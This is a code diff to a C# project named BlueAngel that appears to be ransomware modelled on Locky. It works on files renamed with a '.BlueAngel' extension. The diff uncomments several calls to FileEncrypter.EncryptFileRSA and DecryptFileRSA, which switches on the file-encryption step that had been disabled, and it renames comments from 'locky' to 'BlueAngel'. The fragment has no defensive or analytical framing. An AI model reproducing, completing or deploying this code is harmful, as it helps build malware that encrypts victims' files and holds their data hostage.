@@ -75,7 +75,7 @@ namespace BlueAngel
         public FileInfo[] GetLockyFileCount(string path)
         {
             DirectoryInfo d = new DirectoryInfo(path);
-            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting locky files
+            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
             return Files;
         }
 
@@ -98,7 +98,7 @@ namespace BlueAngel
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
-                //FileEncrypter.EncryptFileRSA(newfilefullname);
+                FileEncrypter.EncryptFileRSA(newfilefullname);
             }
             catch
             {
@@ -122,7 +122,7 @@ namespace BlueAngel
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
-                    //FileEncrypter.EncryptFileRSA(newfilefullname);
+                    FileEncrypter.EncryptFileRSA(newfilefullname);
                 }
                 catch
                 {
@@ -141,7 +141,7 @@ namespace BlueAngel
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
-                //FileEncrypter.DecryptFileRSA(newfilefullname);
+                FileEncrypter.DecryptFileRSA(newfilefullname);
 
             }
             catch
@@ -153,7 +153,7 @@ namespace BlueAngel
         public void UnlockLockyFiles(string path)
         {
             DirectoryInfo d = new DirectoryInfo(path);
-            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting locky files
+            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
             
             foreach (FileInfo file in Files)
             {
@@ -163,7 +163,7 @@ namespace BlueAngel
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
-                    //FileEncrypter.DecryptFileRSA(newfilefullname);
+                    FileEncrypter.DecryptFileRSA(newfilefullname);
 
                 }
                 catch
